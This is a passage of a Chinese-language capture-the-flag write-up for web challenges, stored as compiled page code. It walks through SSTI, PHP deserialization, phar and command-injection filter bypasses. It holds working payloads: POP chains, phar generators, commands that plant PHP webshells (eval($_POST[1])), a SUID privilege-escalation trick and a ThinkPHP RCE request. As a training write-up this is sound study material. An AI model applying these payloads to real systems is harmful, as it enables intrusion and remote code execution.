'os._wrap_close'>\n\u7136\u540e\u627e\u5b83\u7684\u4f4d\u7f6e\uff0c\u662f132\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031222536385.png",alt:"image-20231031222536385"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'\u63a5\u7740\u7528__init__\u91cd\u8f7d\u51fd\u6570\uff0c\u53d1\u73b0\u88ab\u8fc7\u6ee4\u4e86\u53ef\u4ee5\u7528["__in"+"it__"]\uff0c\u8fd9\u91cc\u53d1\u73b0\u5355\u5f15\u53f7\u4e5f\u88ab\u8fc7\u6ee4\u4e86\uff0c\u7528\u53cc\u5f15\u53f7\uff0c\u4e2d\u62ec\u53f7\uff0c\u5927\u62ec\u53f7\n\u7136\u540e\u518d\u7528__goblas__,\u8fd9\u91cc\u7528popen\u6267\u884c\u547d\u4ee4\uff0c\u8fd9\u91ccpopen\u4e5f\u662f\u88ab\u8fc7\u6ee4\u6389\u4e86\u7528+\u8fdb\u884c\u62fc\u63a5\u7ed5\u8fc7["po"+"pen"]\n'})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031223425625.png",alt:"image-20231031223425625"})}),"\n",(0,c.jsx)(e.p,{children:"\u6700\u7ec8payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'{%print({}.__class__.__mro__[1].__subclasses__()[132]["__in"+"it__"]["__globals__"]["po"+"pen"]("cat /flag").read())%}\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u5b98\u65b9payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'{% print(get_flashed_messages.__globals__.os["pop"+"en"]("cat /flag").read()) %}\nget_flashed_messages\u8fd9\u4e2a\u5185\u7f6e\u51fd\u6570\u6ca1\u6709\u88ab\u8fc7\u6ee4\n'})}),"\n",(0,c.jsx)(e.h2,{id:"week4",children:"Week4"}),"\n",(0,c.jsx)(e.h3,{id:"\u9003",children:"\u9003"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\nhighlight_file(__FILE__);\nfunction waf($str){\n    return str_replace("bad","good",$str);\n}\n\nclass GetFlag {\n    public $key;\n    public $cmd = "whoami";\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n    public function __destruct()\n    {\n        system($this->cmd);\n    }\n}\nunserialize(waf(serialize(new GetFlag($_GET[\'key\']))));\n'})}),"\n",(0,c.jsxs)(e.p,{children:["\u6709",(0,c.jsx)(e.code,{children:"str_replace"}),"\u51fd\u6570\uff0c\u8fd9\u9053\u9898\u662fphp\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038\u589e\u591a\u95ee\u9898"]}),"\n",(0,c.jsx)(e.p,{children:"\u9996\u5148\u6784\u9020\u5e8f\u5217\u5316\u5b57\u7b26\u4e32"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'O:7:"GetFlag":2:{s:3:"key";N;s:3:"cmd";s:4:"ls /";}\n'})}),"\n",(0,c.jsxs)(e.p,{children:["\u6211\u4eec\u9700\u8981\u9003\u9038",(0,c.jsx)(e.code,{children:'s:3:"cmd";s:4:"ls /";}'}),"\uff0c\u4e3a\u4e86\u6784\u9020\u95ed\u5408\uff0c\u5728\u524d\u9762\u6dfb\u52a0",(0,c.jsx)(e.code,{children:'";'})]}),"\n",(0,c.jsxs)(e.p,{children:["\u73b0\u5728\u6211\u4eec\u9700\u8981\u9003\u9038\u7684\u662f",(0,c.jsx)(e.code,{children:'";s:3:"cmd";s:4:"ls /";}'}),"\uff0c\u957f\u5ea6\u662f24"]}),"\n",(0,c.jsx)(e.p,{children:"\u56e0\u4e3abad\u66ff\u6362\u6210good\u589e\u52a0\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8f93\u516524\u4e2abad"}),"\n",(0,c.jsxs)(e.p,{children:["\u540c\u6837\uff0c",(0,c.jsx)(e.code,{children:'";s:3:"cmd";s:9:"cat /flag";}'}),"29\u4e2a\u5b57\u7b26"]}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}\n'})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031230621719.png",alt:"image-20231031230621719"})}),"\n",(0,c.jsx)(e.h3,{id:"more-fast",children:"More Fast"}),"\n",(0,c.jsx)(e.h4,{id:"\u6e90\u4ee3\u7801",children:"\u6e90\u4ee3\u7801\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:' <?php\nhighlight_file(__FILE__);\n\nclass Start{\n    public $errMsg;\n    public function __destruct() {\n        die($this->errMsg);\n    }\n}\n\nclass Pwn{\n    public $obj;\n    public function __invoke(){\n        $this->obj->evil();\n    }\n    public function evil() {\n        phpinfo();\n    }\n}\n\nclass Reverse{\n    public $func;\n    public function __get($var) {\n        ($this->func)();\n    }\n}\n\nclass Web{\n    public $func;\n    public $var;\n    public function evil() {\n        if(!preg_match("/flag/i",$this->var)){\n            ($this->func)($this->var);\n        }else{\n            echo "Not Flag";\n        }\n    }\n}\nclass Crypto{\n    public $obj;\n    public function __toString() {\n        $wel = $this->obj->good;\n        return "NewStar";\n    }\n}\nclass Misc{\n    public function evil() {\n        echo "good job but nothing";\n    }\n}\n$a = @unserialize($_POST[\'fast\']);\nthrow new Exception("Nope");\nFatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55\n'})}),"\n",(0,c.jsx)(e.h4,{id:"\u8003\u70b9",children:"\u8003\u70b9\uff1a"}),"\n",(0,c.jsxs)(e.p,{children:["\u4e3b\u8981\u662f",(0,c.jsx)(e.code,{children:"Fast destruct"})]}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.em,{children:"1\u3001PHP\u4e2d\uff0c\u5982\u679c\u5355\u72ec\u6267\u884cunserialize\u51fd\u6570\u8fdb\u884c\u5e38\u89c4\u7684\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u4e48\u88ab\u53cd\u5e8f\u5217\u5316\u540e\u7684\u6574\u4e2a\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\u5c31\u4ec5\u9650\u4e8e\u8fd9\u4e2a\u51fd\u6570\u6267\u884c\u7684\u751f\u547d\u5468\u671f\uff0c\u5f53\u8fd9\u4e2a\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\uff0c\u8fd9\u4e2a\u7c7b\u5c31\u6ca1\u4e86\uff0c\u5728\u6709\u6790\u6784\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5c31\u4f1a\u6267\u884c\u5b83\u3002"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.em,{children:"2\u3001PHP\u4e2d\uff0c\u5982\u679c\u7528\u4e00\u4e2a\u53d8\u91cf\u63a5\u4f4f\u53cd\u5e8f\u5217\u5316\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u90a3\u4e48\u88ab\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\u5176\u751f\u547d\u5468\u671f\u5c31\u4f1a\u53d8\u957f\uff0c\u7531\u4e8e\u5b83\u4e00\u76f4\u90fd\u5b58\u5728\u4e8e\u8fd9\u4e2a\u53d8\u91cf\u5f53\u4e2d\uff0c\u90a3\u4e48\u5728PHP\u811a\u672c\u8d70\u5b8c\u6d41\u7a0b\u4e4b\u540e\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u624d\u4f1a\u88ab\u9500\u6bc1\uff0c\u5728\u6709\u6790\u6784\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u5c31\u4f1a\u5c06\u5176\u6267\u884c\u3002"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.a,{href:"https://wh1tecell.top/2021/11/11/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bfast-destruct/",children:"\u4ece\u4e00\u9053\u9898\u770bfast_destruct"})}),"\n",(0,c.jsx)(e.h4,{id:"\u89e3\u9898",children:"\u89e3\u9898"}),"\n",(0,c.jsx)(e.p,{children:"\u9996\u5148\u6784\u9020pop\u94fe"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\nclass Start{\n    public $errMsg;\n    public function __destruct() {\n        die($this->errMsg);\n    }\n}\nclass Pwn{\n    public $obj;\n    public function __invoke(){\n        $this->obj->evil();\n    }\n    public function evil() {\n        phpinfo();\n    }\n}\nclass Reverse{\n    public $func;\n    public function __get($var) {\n        ($this->func)();\n    }\n}\nclass Web{\n    public $func = \'system\';\n    public $var = \'cat /fl*\';\n    public function evil() {\n        if(!preg_match("/flag/i",$this->var)){\n            ($this->func)($this->var);\n        }else{\n            echo "Not Flag";\n        }\n    }\n}\nclass Crypto{\n    public $obj;\n    public function __toString() {\n        $wel = $this->obj->good;\n        return "NewStar";\n    }\n}\nclass Misc{\n    public function evil() {\n        echo "good job but nothing";\n    }\n}\n$a = new Start();\n$a->errMsg = new Crypto();\n$a->errMsg->obj = new Reverse();\n$a->errMsg->obj->func = new Pwn();\n$a->errMsg->obj->func->obj = new Web();\n$b = serialize($a);\necho $b;\n'})}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:8:"cat /fl*";}}}}}\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u4f20\u8fdb\u53bb\u56de\u663e\u4e00\u4e2a\u62a5\u9519"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231101202055155.png",alt:"image-20231101202055155"})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u65f6\u5019\u6211\u4eec\u9700\u8981\u5feb\u901f\u89e6\u53d1__destruct"}),"\n",(0,c.jsx)(e.p,{children:"\u59ff\u52bf\u4e00\uff1a"}),"\n",(0,c.jsx)(e.p,{children:"\u4fee\u6539\u5e8f\u5217\u5316\u5c5e\u6027\u4e2a\u6570\uff0c1->2\uff0c\u7c7b\u4f3c__wakeup\u7684\u7ed5\u8fc7"}),"\n",(0,c.jsx)(e.p,{children:"\u59ff\u52bf\u4e8c\uff1a"}),"\n",(0,c.jsx)(e.p,{children:"\u53bb\u6389\u751f\u6210\u7684\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u6700\u540e\u7684\u4e00\u4e2a\u5927\u62ec\u53f7"}),"\n",(0,c.jsx)(e.h3,{id:"so-baby-rce",children:"So Baby RCE"}),"\n",(0,c.jsx)(e.p,{children:"\u6e90\u4ee3\u7801"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:'<?php\nerror_reporting(0);\nif(isset($_GET["cmd"])){\n    if(preg_match(\'/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\\||;|\\^|\\\'|\\]|"|<|>|`|\\/| |\\\\\\\\|\\*/i\',$_GET["cmd"])){\n       echo "Don\'t Hack Me";\n    }else{\n        system($_GET["cmd"]);\n    }\n}else{\n    show_source(__FILE__);\n}\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u8fc7\u6ee4\u4e86\u5f88\u591a\u51fd\u6570\u548c\u7b26\u53f7\uff0c\u53ef\u4ee5\u5229\u7528%0A\u591a\u547d\u4ee4\u5207\u6362\u76ee\u5f55\uff0c\u4e0d\u65ad\u5207\u6362\u5230\u6839\u76ee\u5f55\uff0c\u8fdb\u884c\u8bfb\u53d6flag"}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.p,{children:"\u53ef\u4ee5\u7528rev\uff0cuniq\uff0csort"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"cmd=%0Acd${IFS}..%0Acd${IFS}..%0Acd${IFS}..%0Als\ncmd=%0Acd${IFS}..%0Acd${IFS}..%0Acd${IFS}..%0Auniq${IFS}ffff?lllaaaaggggg\n"})}),"\n",(0,c.jsx)(e.h3,{id:"unserializethree",children:"UnserializeThree"}),"\n",(0,c.jsx)(e.p,{children:"\u6e90\u4ee3\u7801"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\nhighlight_file(__FILE__);\nclass Evil{\n    public $cmd;\n    public function __destruct()\n    {\n        if(!preg_match("/>|<|\\?|php|".urldecode("%0a")."/i",$this->cmd)){\n            //Same point ,can you bypass me again?\n            eval("#".$this->cmd);\n        }else{\n            echo "No!";\n        }\n    }\n}\n\nfile_exists($_GET[\'file\']); \n'})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd8\u6709\u4e00\u4e2a\u4e0a\u4f20\u9875\u9762"}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"file_exists \u2014 \u68c0\u67e5\u6587\u4ef6\u6216\u76ee\u5f55\u662f\u5426\u5b58\u5728"}),"\n",(0,c.jsx)(e.p,{children:"file_exists()\u51fd\u6570\u53ef\u89e6\u53d1 phar\u53cd\u5e8f\u5217\u5316"}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"\u6362\u884c\u7b26\u88ab\u8fc7\u6ee4\u4e86\uff0c\u8fd8\u53ef\u4ee5\u7528\u56de\u8f66\u7b26%0d"}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\nclass Evil{\n    public $cmd;\n}\n\n$e = new Evil();\n$e->cmd = urldecode("%0d").\'system("tac /f*");\';\n$phar = new Phar("phar.phar");\n$phar->startBuffering();\n$phar->setStub("<?php __HALT_COMPILER(); ?>");\n$phar->setMetadata($e);\n$phar->addFromString("test.txt", "test");\n$phar->stopBuffering();\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u4e3b\u8981\u4fee\u6539\u7684\u5c31\u662fsetMetadata\u7684\u5185\u5bb9"}),"\n",(0,c.jsx)(e.p,{children:"\u4e0a\u4f20\u65f6\uff0c\u53d1\u73b0phar\u540e\u7f00\u4e0d\u80fd\u4e0a\u4f20\uff0c\u4fee\u6539\u6210png\u540e\u7f00\uff0c\u5176\u5b9e\u4fee\u6539\u6210\u4ec0\u4e48\u90fd\u65e0\u6240\u8c13"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"?file=phar://upload/ed54ee58cd01e120e27939fe4a64fa92.png\n"})}),"\n",(0,c.jsx)(e.h3,{id:"flask-disk",children:"flask disk"}),"\n",(0,c.jsx)(e.p,{children:"\u8bbf\u95eeadmin manage\u53d1\u73b0\u8981\u8f93\u5165pin\u7801\uff0c\u8bf4\u660eflask\u5f00\u542f\u4e86debug\u6a21\u5f0f\u3002\u6240\u4ee5\u53ea\u9700\u8981\u4e0a\u4f20\u4e00\u4e2a\u80fdrce\u7684app.py\u6587\u4ef6\u628a\u539f\u6765\u7684\u8986\u76d6\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-python",children:"from flask import Flask,request\nimport os\napp = Flask(__name__)\n@app.route('/')\ndef index():    \n    try:        \n        cmd = request.args.get('cmd')        \n        data = os.popen(cmd).read()        \n        return data    \n    except:        \n        pass    \n        \n    return \"1\"\nif __name__=='__main__':    \n    app.run(host='0.0.0.0',port=5000,debug=True)\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"cmd=cat /f*\n"})}),"\n",(0,c.jsx)(e.h3,{id:"pharone",children:"PharOne"}),"\n",(0,c.jsx)(e.p,{children:"class.php"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:" <?php\nhighlight_file(__FILE__);\nclass Flag{\n    public $cmd;\n    public function __destruct()\n    {\n        @exec($this->cmd);\n    }\n}\n@unlink($_POST['file']); \n"})}),"\n",(0,c.jsx)(e.p,{children:"\u6709\u4e0a\u4f20\u6587\u4ef6\u7684\u5730\u65b9\uff0c\u8fd8\u6709unlink\u51fd\u6570\uff0c\u8bf4\u660e\u8fd9\u662f\u4e00\u9053phar\u53cd\u5e8f\u5217\u5316\u7684\u9898\u76ee"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\n\nclass Flag{\n    public $cmd = "echo \'<?=eval(\\$_POST[1]);?>\'>/var/www/html/2.php";\n}\n\n$phar = new Phar("1.phar");\n$phar->startBuffering();\n$phar->setStub("<?php __HALT_COMPILER(); ?>");\n\n$o = new Flag();\n$phar->setMetadata($o);\n$phar->addFromString("test.txt", "test");\n$phar->stopBuffering();\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u751f\u6210phar\u6587\u4ef6"}),"\n",(0,c.jsx)(e.p,{children:"\u4e0a\u4f20\u53d1\u73b0\u63d0\u793a\uff0cHacker?"}),"\n",(0,c.jsx)(e.p,{children:"\u4fee\u6539\u6210png\u540e\u7f00"}),"\n",(0,c.jsx)(e.p,{children:"\u63d0\u793a\u8fc7\u6ee4\u4e86__HALT_COMPILER"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS) \n'})}),"\n",(0,c.jsx)(e.p,{children:"\u4f7f\u7528gzip\u8fdb\u884c\u538b\u7f29\uff0c\u4e0a\u4f20\u6210\u529f"}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"file=phar://upload/321532365639f31b3b9f8ea8be0c6be2.png\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8bbf\u95ee2.php\u5373\u53ef"}),"\n",(0,c.jsx)(e.h2,{id:"week5",children:"Week5"}),"\n",(0,c.jsx)(e.h3,{id:"so-baby-rce-again",children:"So Baby RCE Again"}),"\n",(0,c.jsx)(e.p,{children:"\u6e90\u4ee3\u7801"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\nerror_reporting(0);\nif(isset($_GET["cmd"])){\n    if(preg_match(\'/bash|curl/i\',$_GET["cmd"])){\n        echo "Hacker!";\n    }else{\n        shell_exec($_GET["cmd"]);\n    }\n}else{\n    show_source(__FILE__);\n}\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u65e0\u56de\u663eRCE"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u9996\u5148\u770b\u4e00\u4e0b\u76ee\u5f55\ncmd=ls / | tee 1\n\u53d1\u73b0\nffll444aaggg\n\u5c1d\u8bd5\u8bfb\u53d6\uff0c\u8bfb\u53d6\u4e0d\u51fa\u6765\n\u5199\u4e2a\u6728\u9a6c\u5427\ncmd=echo '<?php eval($_POST[1]);?>' > 1.php\n\u8681\u5251\u8fde\u63a5\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u6ca1\u6709\u67e5\u770b\u6743\u9650"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303174012402.png",alt:"image-20240303174012402"})}),"\n",(0,c.jsx)(e.p,{children:"\u63a5\u7740\u8fdb\u884c\u63d0\u6743"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u67e5\u627e\u4e00\u4e0bsuid\u6743\u9650\u7684\u6587\u4ef6\ncmd=find / -type f -perm -4000 2>/dev/null | tee 1\n/bin/date\n/bin/mount\n/bin/su\n/bin/umount\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u5229\u7528date\u8fdb\u884c\u63d0\u6743"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"date -f ffll444aaggg \u53ef\u4ee5\u8bfb\u53d6\u6587\u4ef6\n\u6216\ncmd=date -f /ffll444aaggg 2>1 \u67e5\u770b1\u6587\u4ef6\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303174826909.png",alt:"image-20240303174826909"})}),"\n",(0,c.jsx)(e.h3,{id:"unserialize-again",children:"Unserialize Again"}),"\n",(0,c.jsx)(e.p,{children:"\u8bbf\u95eepairing.php"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:" <?php\nhighlight_file(__FILE__);\nerror_reporting(0);  \nclass story{\n    private $user='admin';\n    public $pass;\n    public $eating;\n    public $God='false';\n    public function __wakeup(){\n        $this->user='human';\n        if(1==1){\n            die();\n        }\n        if(1!=1){\n            echo $fffflag;\n        }\n    }\n    public function __construct(){\n        $this->user='AshenOne';\n        $this->eating='fire';\n        die();\n    }\n    public function __tostring(){\n        return $this->user.$this->pass;\n    }\n    public function __invoke(){\n        if($this->user=='admin'&&$this->pass=='admin'){\n            echo $nothing;\n        }\n    }\n    public function __destruct(){\n        if($this->God=='true'&&$this->user=='admin'){\n            system($this->eating);\n        }\n        else{\n            die('Get Out!');\n        }\n    }\n}                 \nif(isset($_GET['pear'])&&isset($_GET['apple'])){\n    // $Eden=new story();\n    $pear=$_GET['pear'];\n    $Adam=$_GET['apple'];\n    $file=file_get_contents('php://input');\n    file_put_contents($pear,urldecode($file));\n    file_exists($Adam);\n}\nelse{\n    echo '\u591a\u5403\u96ea\u68a8';\n}\n"})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u601d\u8def\uff1a"}),"\n",(0,c.jsx)(e.p,{children:"\u7ed9\u7684\u4e0a\u4f20\u662f\u5047\u7684\uff0c\u4e0d\u80fd\u4e0a\u4f20"}),"\n",(0,c.jsx)(e.p,{children:"\u6211\u4eec\u7528php://input\u4e0a\u4f20"}),"\n",(0,c.jsx)(e.p,{children:"\u7136\u540e\u7528file_exists\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316"}),"\n",(0,c.jsx)(e.p,{children:"\u975e\u9884\u671f\uff1a\u76f4\u63a5\u4e0a\u4f20php\u6587\u4ef6\u5c31\u884c"}),"\n"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\n\nclass story{\n    public $eating = \'cat /f*\';\n    public $God=\'true\';\n}\n\n$phar = new Phar("1.phar");\n$phar->startBuffering();\n$phar->setStub("<?php __HALT_COMPILER(); ?>");\n$o = new story();\n$phar->setMetadata($o);\n$phar->addFromString("test.txt", "test");\n$phar->stopBuffering();\n\necho (file_get_contents(\'1.phar\'));\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u65f6\u8fd8\u4e0d\u884c\uff0c\u8fd8\u9700\u8981\u7ed5\u8fc7wakeup\u51fd\u6570\uff0c\u5c062\u6539\u62103"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319202246183.png",alt:"image-20240319202246183"})}),"\n",(0,c.jsx)(e.p,{children:"\u6211\u4eec\u6253\u5f00\u6587\u4ef6\u5c062\u6539\u6210\u4e863\uff0c\u6587\u4ef6\u5185\u5bb9\u6539\u53d8\u4e86\uff0c\u6211\u4eec\u9700\u8981\u91cd\u65b0\u8fdb\u884c\u7b7e\u540d"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-python",children:"from hashlib import sha1\n\nwith open(\"1.phar\",'rb') as f:\n   text = f.read()\n   main = text[:-28]        #\u6b63\u6587\u90e8\u5206(\u9664\u53bb\u6700\u540e28\u5b57\u8282) \u83b7\u53d6\u8981\u7b7e\u540d\u7684\u6570\u636e\uff08s\uff09\n   end = text[-8:]\t\t  #\u6700\u540e\u516b\u4f4d\u4e5f\u662f\u4e0d\u53d8\u7684 \u83b7\u53d6\u7b7e\u540d\u7c7b\u578b\u548cGBMB\u6807\u8bc6\uff08h\uff09\n   new_sign = sha1(main).digest() # \u5bf9\u8981\u7b7e\u540d\u7684\u6570\u636e\u8fdb\u884cSHA-1\u54c8\u5e0c\u8ba1\u7b97\uff0c\u5e76\u5c06\u539f\u59cb\u6570\u636e\u3001\u7b7e\u540d\u548c\u7c7b\u578b/\u6807\u8bc6\u62fc\u63a5\u6210\u65b0\u7684\u6570\u636enewf\n   new_phar = main + new_sign + end\n   open(\"hack.phar\",'wb').write(new_phar)     #\u5c06\u65b0\u751f\u6210\u7684\u5185\u5bb9\u4ee5\u4e8c\u8fdb\u5236\u65b9\u5f0f\u8986\u76d6\u5199\u5165\u539f\u6765\u7684phar\u6587\u4ef6\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u751f\u6210\u7684hack.phar\u5c31\u662f\u6211\u4eec\u8981\u7684\uff0c\u4e0a\u4f20\u5373\u53ef"}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-http",children:"POST /pairing.php?pear=1.phar&apple=phar://1.phar HTTP/1.1\nHost: ac60fca3-8ea0-4508-92de-e38171dcd42d.node5.buuoj.cn:81\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: http://ac60fca3-8ea0-4508-92de-e38171dcd42d.node5.buuoj.cn:81/pairing.php?pear=1.php\nCookie: looklook=pairing.php\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 449\n\n%3C%3Fphp%20__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0Av%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%40%00%00%00O%3A5%3A%22story%22%3A3%3A%7Bs%3A6%3A%22eating%22%3Bs%3A7%3A%22cat%20/f%2A%22%3Bs%3A3%3A%22God%22%3Bs%3A4%3A%22true%22%3B%7D%08%00%00%00test.txt%04%00%00%00%EF%BF%BD%7F%EF%BF%BDe%04%00%00%00%0C~%7F%D8%B6%01%00%00%00%00%00%00test%EF%BF%BD%5D%EF%BF%BD%1DGCj%3E%EF%BF%BD%EF%BF%BD%8B%29C_%1Dl%E293M%A6%E1AG2%C7%1E%87%B8%DD%02%00%00%00GBMB\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319202922780.png",alt:"image-20240319202922780"})}),"\n",(0,c.jsx)(e.h3,{id:"final",children:"Final"}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"ThinkPHP V5\uff0c\u8fd9\u9898\u662fThinkphp5.0.23 rce\u6f0f\u6d1e"}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"kali\u4e0a\u4e5f\u80fd\u641c\u5f97\u5230"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319210745415.png",alt:"image-20240319210745415"})}),"\n",(0,c.jsx)(e.p,{children:"\u6211\u4eec\u5c31\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u6253\u5427"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-http",children:"POST /index.php?s=captcha HTTP/1.1\nHost: 6f18a5ea-572c-45a9-aa83-c5e4239a4274.node5.buuoj.cn:81\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 